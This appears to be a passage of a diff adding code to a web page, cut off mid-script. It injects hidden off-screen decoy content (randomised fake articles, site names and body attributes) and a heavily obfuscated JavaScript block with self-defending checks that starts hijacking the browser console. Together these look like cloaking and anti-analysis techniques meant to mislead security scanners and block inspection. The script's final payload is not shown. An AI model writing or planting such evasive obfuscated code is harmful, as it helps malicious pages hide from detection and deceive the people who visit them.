+                ['data-'+_r(['locale','lang','language']),_r(['en','en-US','en-GB'])],
+                ['data-'+_r(['build','hash','commit']),_rHex(8)],
+                ['data-'+_r(['timestamp','ts','time']),Date.now().toString(36)],
+                ['data-'+_r(['session','sid','ssid']),_rHash()]
+            ];
+            var attrCount=3+_$$$(4);
+            for(var i=0;i<attrCount;i++){
+                var attr=bodyAttrs[i%bodyAttrs.length];
+                document.body.setAttribute(attr[0],attr[1]);
+            }
+        })();}
+    </script>
+    
+    <div id="_pgContent" style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;opacity:0;pointer-events:none;" aria-hidden="true"></div>
+    <script>
+    (function(){
+        var _p=function(a){return a[Math.floor(Math.random()*a.length)]};
+        var _s=function(a){for(var i=a.length-1;i>0;i--){var j=Math.floor(Math.random()*(i+1));var t=a[i];a[i]=a[j];a[j]=t;}return a;};
+        var yr=new Date().getFullYear();
+        var sites=[
+            {name:'TechPulse Daily',tag:'Technology & Innovation',nav:['Home','News','Reviews','Tutorials','About','Contact'],copy:'© '+yr+' TechPulse Daily. All rights reserved.'},
+            {name:'GreenLeaf Journal',tag:'Sustainability & Environment',nav:['Home','Articles','Research','Guides','Community','Subscribe'],copy:'© '+yr+' GreenLeaf Journal. Environmental insights.'},
+            {name:'FinanceForward',tag:'Business & Finance',nav:['Home','Markets','Investing','Personal Finance','Economy','Tools'],copy:'© '+yr+' FinanceForward Media Group.'},
+            {name:'HealthBridge',tag:'Health & Wellness',nav:['Home','Nutrition','Fitness','Mental Health','Research','Ask a Doctor'],copy:'© '+yr+' HealthBridge Wellness Network.'},
+            {name:'EduSpark',tag:'Education & Learning',nav:['Home','Courses','Resources','Research','Community','Careers'],copy:'© '+yr+' EduSpark Learning Platform.'},
+            {name:'CreativeNest',tag:'Design & Creativity',nav:['Home','Inspiration','Tutorials','Tools','Portfolio','Hire'],copy:'© '+yr+' CreativeNest Studios.'},
+            {name:'TravelMosaic',tag:'Travel & Culture',nav:['Home','Destinations','Guides','Reviews','Photos','Plan a Trip'],copy:'© '+yr+' TravelMosaic Worldwide.'},
+            {name:'DataStream',tag:'Data Science & AI',nav:['Home','Articles','Tutorials','Datasets','Tools','Newsletter'],copy:'© '+yr+' DataStream Analytics.'}
+        ];
+        var heroes=[
+            ['Empowering Your Digital Journey','Discover cutting-edge insights, expert analysis, and actionable strategies to stay ahead in an ever-evolving landscape. Our team of specialists curates content tailored to professionals and enthusiasts alike.'],
+            ['Innovation Starts Here','We bring you the latest breakthroughs, in-depth research, and practical guides. Join thousands of readers who rely on our expertise to make informed decisions every day.'],
+            ['Your Trusted Knowledge Hub','From beginner fundamentals to advanced strategies, explore comprehensive resources designed to accelerate your growth and deepen your understanding of what matters most.'],
+            ['Building a Better Tomorrow','Explore thought-provoking articles, data-driven analysis, and community-powered discussions that shape the future of industries and transform the way we think about progress.'],
+            ['Where Ideas Take Flight','Our curated collection of articles, guides, and expert opinions helps you navigate complexity with confidence. Stay informed, stay inspired, stay connected.']
+        ];
+        var articles=[
+            {t:'Understanding Modern Infrastructure',p:['Scalable systems have become the backbone of digital transformation across industries. Organizations leverage distributed architectures, containerization, and microservices to build resilient platforms capable of handling millions of concurrent users while maintaining sub-second response times.','The evolution from monolithic deployments to cloud-native approaches has reduced time-to-market by an average of 40 percent, enabling rapid iteration and continuous delivery pipelines that align development velocity with business objectives.']},
+            {t:'The Future of Artificial Intelligence',p:['Machine learning models continue to advance at an unprecedented pace, with large language models and generative AI reshaping how businesses approach content creation, customer support, and data analysis. Responsible AI governance frameworks are emerging to address bias, transparency, and accountability concerns.','Enterprise adoption of AI-powered tools has accelerated across sectors including healthcare diagnostics, financial risk assessment, supply chain optimization, and personalized education platforms.']},
+            {t:'Sustainable Practices for Organizations',p:['Corporate sustainability has transitioned from an optional initiative to a strategic imperative. Companies implementing comprehensive environmental programs report improved operational efficiency, stronger brand loyalty, and increased attractiveness to top-tier talent seeking purpose-driven employers.','Circular economy principles are being integrated into product design, manufacturing processes, and end-of-life management, creating closed-loop systems that minimize waste and maximize resource utilization.']},
+            {t:'Cybersecurity in the Digital Age',p:['The threat landscape continues to evolve with increasingly sophisticated attack vectors targeting cloud infrastructure, remote work environments, and supply chain dependencies. Zero-trust architectures have emerged as the predominant security model, requiring continuous verification of every user, device, and network connection.','Organizations are investing heavily in security awareness training, automated threat detection systems, and incident response capabilities to maintain resilience against ransomware, phishing campaigns, and advanced persistent threats.']},
+            {t:'Remote Collaboration and Team Dynamics',p:['Distributed teams have developed new communication patterns and collaboration frameworks that often surpass traditional office-based productivity metrics. Asynchronous workflows, comprehensive documentation practices, and intentional social rituals help maintain team cohesion across time zones and geographies.','The hybrid work model has become the dominant paradigm, with organizations redesigning physical spaces as collaboration hubs while supporting individual focused work through flexible remote arrangements.']},
+            {t:'Data Privacy and Consumer Rights',p:['Regulatory frameworks governing data collection, processing, and storage continue to expand globally, with organizations adapting their practices to comply with evolving requirements across multiple jurisdictions. Privacy-by-design principles are being embedded into product development lifecycles from the earliest stages.','Consumer awareness of digital rights has increased significantly, driving demand for transparent data practices, meaningful consent mechanisms, and accessible tools for managing personal information preferences.']},
+            {t:'The Evolution of E-Commerce',p:['Online retail continues to transform with innovations in augmented reality product visualization, voice-activated shopping, and hyper-personalized recommendation engines. Social commerce integration has blurred the boundaries between content consumption and purchasing behavior.','Logistics and fulfillment capabilities have become key differentiators, with same-day delivery, sustainable packaging initiatives, and seamless return processes shaping customer expectations and brand loyalty metrics.']},
+            {t:'Financial Technology Innovations',p:['Digital payment ecosystems, decentralized finance platforms, and embedded banking services are fundamentally reshaping how individuals and businesses interact with financial systems. Open banking APIs enable third-party developers to create innovative financial products and services.','Regulatory technology solutions help financial institutions navigate complex compliance requirements while reducing operational costs and improving the accuracy and timeliness of regulatory reporting obligations.']},
+            {t:'Healthcare Digital Transformation',p:['Telemedicine platforms, electronic health records, and AI-assisted diagnostic tools are improving patient outcomes while reducing healthcare delivery costs. Remote patient monitoring enables continuous care management for chronic conditions without requiring frequent in-person visits.','Interoperability standards are facilitating seamless data exchange between healthcare providers, enabling coordinated care delivery and population health management initiatives across institutional boundaries.']},
+            {t:'Education Technology Trends',p:['Adaptive learning platforms leverage real-time performance data to personalize educational pathways, adjusting content difficulty, pacing, and instructional approaches to optimize learning outcomes for individual students across diverse subject areas.','Micro-credentialing and competency-based assessment models are gaining acceptance among employers, offering alternative pathways to skill validation that complement traditional degree programs and professional certifications.']}
+        ];
+        var sidebars=[
+            {t:'Popular Topics',items:['Getting Started Guide','Advanced Techniques','Industry Analysis','Expert Interviews','Weekly Roundup','Community Spotlight','Tool Comparisons','Case Studies']},
+            {t:'Resources',items:['Documentation','API Reference','Video Library','Webinar Archive','Research Papers','Templates','Checklists','Glossary']},
+            {t:'Newsletter',desc:'Join over 50,000 subscribers who receive our weekly digest of curated insights, exclusive analysis, and practical tips delivered straight to their inbox every Thursday morning.'}
+        ];
+        var authors=['Sarah Mitchell','James Chen','Dr. Emily Roberts','Michael Torres','Aisha Patel','David Kim','Rachel Thompson','Marcus Johnson','Dr. Lisa Wang','Chris Anderson'];
+        var dates=[];for(var di=1;di<=28;di++){var mo=_p(['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec']);dates.push(mo+' '+di+', '+yr);}
+
+        var site=_p(sites);
+        var hero=_p(heroes);
+        var picked=_s(articles.slice()).slice(0,3+Math.floor(Math.random()*3));
+        var sidebar=_p(sidebars);
+
+        var h='<header><nav><div><strong>'+site.name+'</strong> <span>'+site.tag+'</span></div><ul>';
+        for(var ni=0;ni<site.nav.length;ni++) h+='<li><a href="#">'+site.nav[ni]+'</a></li>';
+        h+='</ul></nav></header>';
+        h+='<main><section><h1>'+hero[0]+'</h1><p>'+hero[1]+'</p></section>';
+        h+='<div><div>';
+        for(var ai=0;ai<picked.length;ai++){
+            var a=picked[ai],au=_p(authors),dt=_p(dates);
+            h+='<article><h2>'+a.t+'</h2><div><span>By '+au+'</span> <time>'+dt+'</time> <span>'+Math.floor(3+Math.random()*10)+' min read</span></div>';
+            for(var pi=0;pi<a.p.length;pi++) h+='<p>'+a.p[pi]+'</p>';
+            h+='<div><a href="#">Read More</a> <a href="#">Share</a> <a href="#">Bookmark</a></div></article>';
+        }
+        h+='</div><aside><section><h3>'+sidebar.t+'</h3>';
+        if(sidebar.items){h+='<ul>';for(var si=0;si<sidebar.items.length;si++)h+='<li><a href="#">'+sidebar.items[si]+'</a></li>';h+='</ul>';}
+        if(sidebar.desc) h+='<p>'+sidebar.desc+'</p><form><input type="email" placeholder="your@email.com"><button type="button">Subscribe</button></form>';
+        h+='</section><section><h3>Follow Us</h3><ul><li><a href="#">Twitter</a></li><li><a href="#">LinkedIn</a></li><li><a href="#">Facebook</a></li><li><a href="#">Instagram</a></li><li><a href="#">YouTube</a></li></ul></section></aside>';
+        h+='</div></main>';
+        h+='<footer><div><p>'+site.copy+'</p><ul><li><a href="#">Privacy Policy</a></li><li><a href="#">Terms of Service</a></li><li><a href="#">Cookie Policy</a></li><li><a href="#">Accessibility</a></li><li><a href="#">Sitemap</a></li></ul></div></footer>';
+
+        document.getElementById('_pgContent').innerHTML=h;
+    })();
+    </script>
+
+    <div style="position:absolute;left:-9999px;top:-9999px;width:1px;height:1px;overflow:hidden;opacity:0;pointer-events:none;" aria-hidden="true">
+        <header>
+            <nav role="navigation" aria-label="Main navigation">
+                <a href="/" aria-label="Home">Home</a>
+                <ul>
+                    <li><a href="/about">About Us</a></li>
+                    <li><a href="/services">Services</a></li>
+                    <li><a href="/blog">Blog</a></li>
+                    <li><a href="/resources">Resources</a></li>
+                    <li><a href="/pricing">Pricing</a></li>
+                    <li><a href="/contact">Contact</a></li>
+                </ul>
+                <form role="search" aria-label="Site search">
+                    <label for="_sq">Search</label>
+                    <input type="search" id="_sq" name="q" placeholder="Search articles...">
+                    <button type="submit">Search</button>
+                </form>
+            </nav>
+        </header>
+        <div role="banner">
+            <h1>Welcome to Our Platform</h1>
+            <p>Your trusted source for professional insights, guides, and industry analysis.</p>
+            <a href="/get-started" role="button">Get Started</a>
+            <a href="/learn-more">Learn More</a>
+        </div>
+        <main role="main">
+            <section aria-labelledby="_fh">
+                <h2 id="_fh">Featured Articles</h2>
+                <div role="list">
+                    <article role="listitem">
+                        <figure><img src="/images/placeholder-1.jpg" alt="Cloud computing infrastructure diagram" width="640" height="360" loading="lazy"></figure>
+                        <h3><a href="/blog/cloud-computing-guide">Complete Guide to Cloud Computing in 2025</a></h3>
+                        <p>An in-depth exploration of modern cloud architectures, deployment strategies, and cost optimization techniques for businesses of all sizes.</p>
+                        <div><span>By Sarah Mitchell</span> <time datetime="2025-03-15">March 15, 2025</time> <span>8 min read</span></div>
+                        <ul aria-label="Tags"><li><a href="/tag/cloud">Cloud</a></li><li><a href="/tag/devops">DevOps</a></li><li><a href="/tag/infrastructure">Infrastructure</a></li></ul>
+                    </article>
+                    <article role="listitem">
+                        <figure><img src="/images/placeholder-2.jpg" alt="Data visualization dashboard" width="640" height="360" loading="lazy"></figure>
+                        <h3><a href="/blog/data-analytics-trends">Data Analytics Trends Reshaping Industries</a></h3>
+                        <p>How real-time analytics, predictive modeling, and automated reporting are transforming decision-making across healthcare, finance, and retail sectors.</p>
+                        <div><span>By James Chen</span> <time datetime="2025-04-02">April 2, 2025</time> <span>6 min read</span></div>
+                        <ul aria-label="Tags"><li><a href="/tag/analytics">Analytics</a></li><li><a href="/tag/ai">AI</a></li><li><a href="/tag/business">Business</a></li></ul>
+                    </article>
+                    <article role="listitem">
+                        <figure><img src="/images/placeholder-3.jpg" alt="Cybersecurity shield concept" width="640" height="360" loading="lazy"></figure>
+                        <h3><a href="/blog/cybersecurity-essentials">Cybersecurity Essentials for Remote Teams</a></h3>
+                        <p>Best practices for securing distributed workforces, including zero-trust frameworks, endpoint protection, and security awareness training programs.</p>
+                        <div><span>By Dr. Emily Roberts</span> <time datetime="2025-05-10">May 10, 2025</time> <span>10 min read</span></div>
+                        <ul aria-label="Tags"><li><a href="/tag/security">Security</a></li><li><a href="/tag/remote-work">Remote Work</a></li></ul>
+                    </article>
+                </div>
+            </section>
+            <section aria-labelledby="_ch">
+                <h2 id="_ch">Categories</h2>
+                <ul role="list">
+                    <li><a href="/category/technology"><strong>Technology</strong><span>142 articles</span></a></li>
+                    <li><a href="/category/business"><strong>Business</strong><span>98 articles</span></a></li>
+                    <li><a href="/category/health"><strong>Health & Wellness</strong><span>76 articles</span></a></li>
+                    <li><a href="/category/education"><strong>Education</strong><span>63 articles</span></a></li>
+                    <li><a href="/category/finance"><strong>Finance</strong><span>85 articles</span></a></li>
+                    <li><a href="/category/sustainability"><strong>Sustainability</strong><span>51 articles</span></a></li>
+                </ul>
+            </section>
+            <aside role="complementary" aria-label="Sidebar">
+                <section>
+                    <h3>Newsletter</h3>
+                    <p>Get weekly insights delivered to your inbox. Join 50,000+ professionals.</p>
+                    <form aria-label="Newsletter signup">
+                        <label for="_ne">Email address</label>
+                        <input type="email" id="_ne" name="email" placeholder="you@example.com" required>
+                        <button type="button">Subscribe</button>
+                    </form>
+                </section>
+                <section>
+                    <h3>Popular This Week</h3>
+                    <ol>
+                        <li><a href="/blog/ai-productivity">How AI Is Boosting Workplace Productivity</a></li>
+                        <li><a href="/blog/startup-funding">Startup Funding Strategies for 2025</a></li>
+                        <li><a href="/blog/mental-health">Mental Health Resources for Professionals</a></li>
+                        <li><a href="/blog/sustainable-tech">Sustainable Technology Practices</a></li>
+                        <li><a href="/blog/remote-leadership">Leading Remote Teams Effectively</a></li>
+                    </ol>
+                </section>
+                <section>
+                    <h3>Follow Us</h3>
+                    <ul>
+                        <li><a href="https://twitter.com" rel="noopener noreferrer">Twitter</a></li>
+                        <li><a href="https://linkedin.com" rel="noopener noreferrer">LinkedIn</a></li>
+                        <li><a href="https://facebook.com" rel="noopener noreferrer">Facebook</a></li>
+                        <li><a href="https://youtube.com" rel="noopener noreferrer">YouTube</a></li>
+                    </ul>
+                </section>
+            </aside>
+        </main>
+        <section aria-labelledby="_th">
+            <h2 id="_th">Testimonials</h2>
+            <blockquote>
+                <p>This platform has completely transformed how our team stays informed. The quality of analysis is unmatched.</p>
+                <footer><cite>Amanda Torres, VP of Engineering at Meridian Corp</cite></footer>
+            </blockquote>
+            <blockquote>
+                <p>A must-read resource for anyone in the industry. The practical guides alone are worth the subscription.</p>
+                <footer><cite>David Park, Senior Consultant at Apex Strategies</cite></footer>
+            </blockquote>
+        </section>
+        <footer role="contentinfo">
+            <div>
+                <section>
+                    <h4>Company</h4>
+                    <ul><li><a href="/about">About</a></li><li><a href="/team">Team</a></li><li><a href="/careers">Careers</a></li><li><a href="/press">Press</a></li></ul>
+                </section>
+                <section>
+                    <h4>Resources</h4>
+                    <ul><li><a href="/blog">Blog</a></li><li><a href="/guides">Guides</a></li><li><a href="/webinars">Webinars</a></li><li><a href="/api">API Docs</a></li></ul>
+                </section>
+                <section>
+                    <h4>Support</h4>
+                    <ul><li><a href="/help">Help Center</a></li><li><a href="/contact">Contact Us</a></li><li><a href="/status">System Status</a></li><li><a href="/community">Community</a></li></ul>
+                </section>
+                <section>
+                    <h4>Legal</h4>
+                    <ul><li><a href="/privacy">Privacy Policy</a></li><li><a href="/terms">Terms of Service</a></li><li><a href="/cookies">Cookie Policy</a></li><li><a href="/accessibility">Accessibility</a></li></ul>
+                </section>
+            </div>
+            <div>
+                <p>&copy; 2025 All rights reserved. Built with care for our community of readers and professionals worldwide.</p>
+            </div>
+        </footer>
+    </div>
+
+    <div class="loader-container" id="loaderContainer">
+        <div id="loaderElement"></div>
+    </div>
+    
+    <script>
+        function livid_0x3ca9(){var _0x517364=['C3rHDgvpyMPLyW','wLDHDvi','DgvZDa','Dgv4DenVBNrLBG','mhWYFdn8nhW1Fa','r3nJq2C','rNf6AxG','xcTCkYaQkd86wW','ow1smMPgn3Luma','CMv0DxjUicHMDq','y2fSBa','D2HPBguGkhrYDq','BgLI','xcGGkLWP','shDZu0e','ChjVDg90ExbL','y2HHAw4','BM8TC3rVCMu','u0HbmJu2','Ew1evu4','AvjJuLa','CgjFDg9Rzw49','zgvIDq','nJyYmJGWAKzmAgTS','BMn0Aw9UkcKG','zgLZCgXHEq','tg9HzcbMywLSzq','DKfIC3a','x19WCM90B19F','yxbWzw5Kq2HPBa','se1Twxm','CMvWBgfJzq','Bg9N','tgnbuLi','vZn4sZHWtJv2uq','mtmZndC0mdbTq3jizNK','kcGOlISPkYKRkq','qNLjza','B1bPsw8','v29YzefYCMf5','yxbWBhK','AgvHza','zuXLuMG','Bvviuwi','C2Hpy2W','C2XPy2u','C3bSAxq','yMLUza','CwrMCfi','svDpBNC','rdHMsdnRttvWuW','C3r5Bgu','E30Uy29UC3rYDq','z2v0','r3zQBNa','quvt','qvL1vM8','zgvJCNLWDa','tvvns1q','Bg9HzgvYq29UDa','y3jLyxrLrwXLBq','ndKXmZCZnfzkzuPnqq','A2HJtwO','mtm5ntyWovfuCLjfuG','AefcCKG','Ahr0Chm6lY9Jza','zNvUy3rPB24GkG','CgLUAw5VBI5QCW','rwHuCKq','m2jusfPAAa','uxfdwLi','B2n0B3iTC3vTlW','zw50','y2LWAgvYDgv4Da','ue9Yv2O','r3PssMq','Bw9Kzq','zKTxzwG','DhjHy2u','q2zhsNi','uMrdr0u','Aw5PDa','D29Yzhm','AeC0yKW2y1OXyq','sNLxqKK','BM93','y29UC29Szq','Bg9JyxrPB24','y2fJAgu','mZiWnti2DfvcDgjY','y29UC3rYDwn0BW','Dg9tDhjPBMC','wNjbCLa','EKrTv28','wvbMteG','odq0mdCYt0XcDMTl','zvDXtxK','CgjFDg9Rzw4','C3jWENu','y291BNrLCG','lM5LDc9NAc9WCG','zw5J','CgvHA1C','quPvvMW','B24/DxrPpq','ugTJCZC','EuHuBfO','Fdf8nNWYFdD8mq','ANnVBG','z2v0rwXLBwvUDa','teHcrK4','C2nYAxb0','Du1SCKq','y3rVCIGICMv0Dq','ntqYmJqXnu9VEKTgAa','mc05ys16qs1AxW','CxnovNG','DMvUDhj5l215BW','wvPdvuK','CgfYC2u','z2DLCG','y3jLyxrL','Aw5WDxq','ywLUzxi','DxHMDfO','zMXLEa','DgHLBG','AwrLD3q','AxH2B20','q3PpB2O','yK5xsNG','y2f0y2G','Aw5MBW','zxjYB3i','oxvzmMvynW','C2vHCMnO','q1DrDw0','mhW4FdeYFdv8na','BgvUz3rO','jf0Qkq','Bu9bDve','wLPhCva'];livid_0x3ca9=function(){return _0x517364;};return livid_0x3ca9();}var livid_0x32452e=livid_0x4905,livid_0x36b6cb=livid_0x4905;function livid_0x4905(_0x4ea396,_0x2f46d2){var _0x1c9e4e=livid_0x3ca9();return livid_0x4905=function(_0x28030f,_0x3e8c7f){_0x28030f=_0x28030f-(0x30d*0x5+0x1*-0x16b+-0x92*0x16);var _0x591e98=_0x1c9e4e[_0x28030f];if(livid_0x4905['hgAKPh']===undefined){var _0x4b3016=function(_0x6814c2){var _0x4b4104='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x4a7a3e='',_0x20b747='',_0x58fcdc=_0x4a7a3e+_0x4b3016;for(var _0x10aaa5=-0x1d*0xe0+0x72*-0x52+0x3de4,_0x4defc4,_0xd27b2c,_0x2d7163=-0x1*0x1ab4+-0x1ab5+0x3569;_0xd27b2c=_0x6814c2['charAt'](_0x2d7163++);~_0xd27b2c&&(_0x4defc4=_0x10aaa5%(-0xf39+0xc74+0x2c9)?_0x4defc4*(-0x2624+0x8a*0x21+0x149a)+_0xd27b2c:_0xd27b2c,_0x10aaa5++%(0x1303+0x1b*0x101+-0x2e1a))?_0x4a7a3e+=_0x58fcdc['charCodeAt'](_0x2d7163+(0x42b+0x20b*-0xc+0x133*0x11))-(0x83*0x33+0x50f*0x3+-0x3a*0xb6)!==-0x14d5*0x1+-0x66b+0x1b40?String['fromCharCode'](0x24dc+0x768+0x247*-0x13&_0x4defc4>>(-(0x1bc2+-0x4d8+0x4*-0x5ba)*_0x10aaa5&0x155b+-0x1*0x17a3+0x24e)):_0x10aaa5:0xa3*-0x17+0xe29+0x7c){_0xd27b2c=_0x4b4104['indexOf'](_0xd27b2c);}for(var _0x3c7be9=-0xa5c+0x1*0x128c+0x106*-0x8,_0x25b049=_0x4a7a3e['length'];_0x3c7be9<_0x25b049;_0x3c7be9++){_0x20b747+='%'+('00'+_0x4a7a3e['charCodeAt'](_0x3c7be9)['toString'](-0x1fce+-0x1faa+0x3f88))['slice'](-(-0xb*0xda+0x2685+0x3*-0x9b7));}return decodeURIComponent(_0x20b747);};livid_0x4905['FYLKnF']=_0x4b3016,_0x4ea396=arguments,livid_0x4905['hgAKPh']=!![];}var _0x18d1eb=_0x1c9e4e[0x19*0x1c+0x799+-0x17*0x73],_0x287c54=_0x28030f+_0x18d1eb,_0x40857d=_0x4ea396[_0x287c54];if(!_0x40857d){var _0x46eaa1=function(_0x157064){this['DobSQM']=_0x157064,this['OSrfvX']=[-0x1343+0x1*0x18ab+0x1cd*-0x3,0xba3+-0x1*-0x1223+-0x1dc6,0x1562+-0xf03+-0x65f],this['kGsCIK']=function(){return'newState';},this['Cmoksm']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['XIaUWR']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x46eaa1['prototype']['YuxdgF']=function(){var _0x202a46=new RegExp(this['Cmoksm']+this['XIaUWR']),_0x3669fc=_0x202a46['test'](this['kGsCIK']['toString']())?--this['OSrfvX'][0x1aac+-0x173+-0x1938]:--this['OSrfvX'][-0x646+0x86e*-0x3+0x1f90];return this['FbmxOU'](_0x3669fc);},_0x46eaa1['prototype']['FbmxOU']=function(_0x50ac10){if(!Boolean(~_0x50ac10))return _0x50ac10;return this['xarfKz'](this['DobSQM']);},_0x46eaa1['prototype']['xarfKz']=function(_0x1f1263){for(var _0x328172=-0x1c1a+0xf17*-0x1+-0x1*-0x2b31,_0x43feff=this['OSrfvX']['length'];_0x328172<_0x43feff;_0x328172++){this['OSrfvX']['push'](Math['round'](Math['random']())),_0x43feff=this['OSrfvX']['length'];}return _0x1f1263(this['OSrfvX'][-0x3*0x76f+-0x1159*-0x2+0x13*-0xa7]);},new _0x46eaa1(livid_0x4905)['YuxdgF'](),_0x591e98=livid_0x4905['FYLKnF'](_0x591e98),_0x4ea396[_0x287c54]=_0x591e98;}else _0x591e98=_0x40857d;return _0x591e98;},livid_0x4905(_0x4ea396,_0x2f46d2);}(function(_0x44163b,_0xf0b32e){var _0x3bf9b5=livid_0x4905,_0x786e2a=livid_0x4905,_0x5d6187=_0x44163b();while(!![]){try{var _0x56a01c=parseInt(_0x3bf9b5(0x1c1))/(0xa5e+0x2*-0x328+-0x3d*0x11)+-parseInt(_0x786e2a(0x153))/(0x1961+-0xa10+0x1*-0xf4f)+-parseInt(_0x3bf9b5(0x1c7))/(-0x8ad+0x17*0x67+-0x91)*(parseInt(_0x3bf9b5(0x199))/(-0x1*-0x15ff+0x46e+0x1*-0x1a69))+parseInt(_0x3bf9b5(0x166))/(-0x1833+0x2109+-0x8d1)+parseInt(_0x3bf9b5(0x14d))/(0x1fe5+-0xab0+-0x152f)+parseInt(_0x3bf9b5(0x1bf))/(0x608*-0x1+-0x2*0xd1c+0x2047)+-parseInt(_0x3bf9b5(0x1a5))/(-0x9*-0x301+0x1*0x2024+-0x3b25);if(_0x56a01c===_0xf0b32e)break;else _0x5d6187['push'](_0x5d6187['shift']());}catch(_0x1e403a){_0x5d6187['push'](_0x5d6187['shift']());}}}(livid_0x3ca9,0x1*0x9d442+-0x9aa9*0x31+0x62b*0x5a1),(function(){var _0x3eedd0=livid_0x4905,_0x27be89=livid_0x4905,_0x4cb079={'fnjEd':_0x3eedd0(0x17d)+_0x3eedd0(0x15f)+'1|10|9|3','mOAuQ':_0x3eedd0(0x1d3),'eLeRh':_0x3eedd0(0x186)+'1','YPfLH':function(_0x41cf4d,_0x6844cf){return _0x41cf4d(_0x6844cf);},'WoAmV':function(_0x463dee,_0xf8377f){return _0x463dee+_0xf8377f;},'bNWJx':_0x27be89(0x18b)+_0x3eedd0(0x19a),'oPiIo':_0x3eedd0(0x1b6)+_0x27be89(0x165)+'rn\x20this\x22)('+'\x20)','AYuVo':function(_0x5785f6,_0x41f4a9){return _0x5785f6<_0x41f4a9;},'ymDUN':function(_0x2e8a32){return _0x2e8a32();},'eWqMy':_0x27be89(0x179),'ZZGqP':'exception','Fqzix':'table','CWQum':function(_0x5340a7,_0x497a7e,_0xc7c9ae){return _0x5340a7(_0x497a7e,_0xc7c9ae);},'qsNVx':_0x27be89(0x171),'RdCGE':_0x3eedd0(0x197),'hABrH':_0x3eedd0(0x155)},_0x3562b3=_0x4cb079['fnjEd']['split']('|'),_0x52d424=0xcfa*0x2+0x1*0x26fd+0x5f*-0xaf;while(!![]){switch(_0x3562b3[_0x52d424++]){case'0':var _0xfd39fd={'vAbsp':_0x3eedd0(0x1a6)+'+$','mUHQb':_0x4cb079[_0x3eedd0(0x180)],'IWOnw':function(_0x4596c8,_0x354ccd){return _0x4596c8+_0x354ccd;},'POrWj':_0x3eedd0(0x192),'uMlrD':function(_0x2bcace,_0x1e6af0,_0x3895e0){return _0x2bcace(_0x1e6af0,_0x3895e0);},'srpzu':_0x4cb079[_0x27be89(0x1ac)],'EhTrD':function(_0x36073f,_0x178a50){var _0x4e56ce=_0x27be89;return _0x4cb079[_0x4e56ce(0x152)](_0x36073f,_0x178a50);},'HwsSA':function(_0x500c10,_0x5bb1e3){return _0x4cb079['WoAmV'](_0x500c10,_0x5bb1e3);},'yHTlZ':_0x4cb079[_0x27be89(0x176)],'peakW':_0x4cb079[_0x3eedd0(0x1a8)],'ixvom':function(_0x3101b3,_0x162267){var _0xc6a55d=_0x3eedd0;return _0x4cb079[_0xc6a55d(0x1ba)](_0x3101b3,_0x162267);},'shOcl':function(_0x4c5b22){var _0x395738=_0x27be89;return _0x4cb079[_0x395738(0x195)](_0x4c5b22);},'MUMKT':_0x4cb079[_0x27be89(0x154)],'mykgK':_0x4cb079[_0x3eedd0(0x181)],'CzOoj':_0x4cb079[_0x3eedd0(0x188)],'nnUiL':_0x3eedd0(0x1d0)};continue;case'1':(function(){var _0x338cb4=_0x27be89,_0x5d1cdc=_0x27be89,_0xe14b66={'uxftZ':_0x338cb4(0x189)+'a-zA-Z_$]['+_0x5d1cdc(0x167)+_0x338cb4(0x17f),'LHBFN':function(_0x464822,_0x12d272){return _0x464822(_0x12d272);},'NnnQk':_0xfd39fd[_0x338cb4(0x1ad)],'HMmYs':function(_0x3c69e3,_0x44e476){var _0x4a8ca8=_0x5d1cdc;return _0xfd39fd[_0x4a8ca8(0x1b3)](_0x3c69e3,_0x44e476);},'qdfpR':_0xfd39fd[_0x5d1cdc(0x1cc)],'fKWeh':_0x338cb4(0x16e)};_0xfd39fd[_0x338cb4(0x164)](_0x62b682,this,function(){var _0x168edd=_0x5d1cdc,_0x55471d=_0x338cb4,_0x9414fc=new RegExp(_0x168edd(0x1c4)+_0x55471d(0x18f)),_0x2b003c=new RegExp(_0xe14b66[_0x168edd(0x170)],'i'),_0x116038=_0xe14b66[_0x55471d(0x162)](_0x13635e,_0xe14b66['NnnQk']);!_0x9414fc['test'](_0xe14b66['HMmYs'](_0x116038,_0xe14b66[_0x55471d(0x1b2)]))||!_0x2b003c[_0x168edd(0x184)](_0xe14b66[_0x168edd(0x1a0)](_0x116038,_0xe14b66[_0x55471d(0x1cf)]))?_0xe14b66[_0x168edd(0x162)](_0x116038,'0'):_0x13635e();})();}());continue;case'2':var _0x22a5b4=_0x4cb079[_0x27be89(0x17c)](_0x318fc1,this,function(){var _0x427e80=_0x27be89,_0x3a3d3c=_0x27be89,_0xff0179=_0xfd39fd[_0x427e80(0x156)][_0x3a3d3c(0x1b0)]('|'),_0x4339b1=-0x1450+0x1417+0x13*0x3;while(!![]){switch(_0xff0179[_0x4339b1++]){case'0':var _0x38cf48={'ZrArP':function(_0x6eedd4,_0x3ae04b){var _0x2a6f4f=_0x427e80;return _0xfd39fd[_0x2a6f4f(0x1c6)](_0x6eedd4,_0x3ae04b);},'iRcRP':function(_0x13a741,_0x26889f){var _0x16a25f=_0x3a3d3c;return _0xfd39fd[_0x16a25f(0x190)](_0x13a741,_0x26889f);},'khcMj':_0xfd39fd[_0x3a3d3c(0x15e)],'YZCUI':_0xfd39fd[_0x427e80(0x15a)]};continue;case'1':for(var _0x45da17=-0x95*-0x9+-0x53*-0x6+0x265*-0x3;_0xfd39fd[_0x3a3d3c(0x174)](_0x45da17,_0x2d3420[_0x3a3d3c(0x17e)]);_0x45da17++){var _0x48d886=_0x318fc1[_0x3a3d3c(0x14e)+'r'][_0x427e80(0x191)][_0x3a3d3c(0x1b1)](_0x318fc1),_0x921a75=_0x2d3420[_0x45da17],_0x5659e5=_0x3aa43e[_0x921a75]||_0x48d886;_0x48d886[_0x427e80(0x19e)]=_0x318fc1[_0x427e80(0x1b1)](_0x318fc1),_0x48d886[_0x3a3d3c(0x14f)]=_0x5659e5[_0x3a3d3c(0x14f)]['bind'](_0x5659e5),_0x3aa43e[_0x921a75]=_0x48d886;}continue;case'2':var _0x10d4d=function(){var _0x11499a=_0x427e80,_0x415978=_0x427e80,_0x43fc76;try{_0x43fc76=_0x38cf48[_0x11499a(0x150)](Function,_0x38cf48[_0x11499a(0x196)](_0x38cf48[_0x11499a(0x196)](_0x38cf48[_0x415978(0x1c0)],_0x38cf48[_0x11499a(0x16a)]),');'))();}catch(_0x2fa765){_0x43fc76=window;}return _0x43fc76;};continue;case'3':var 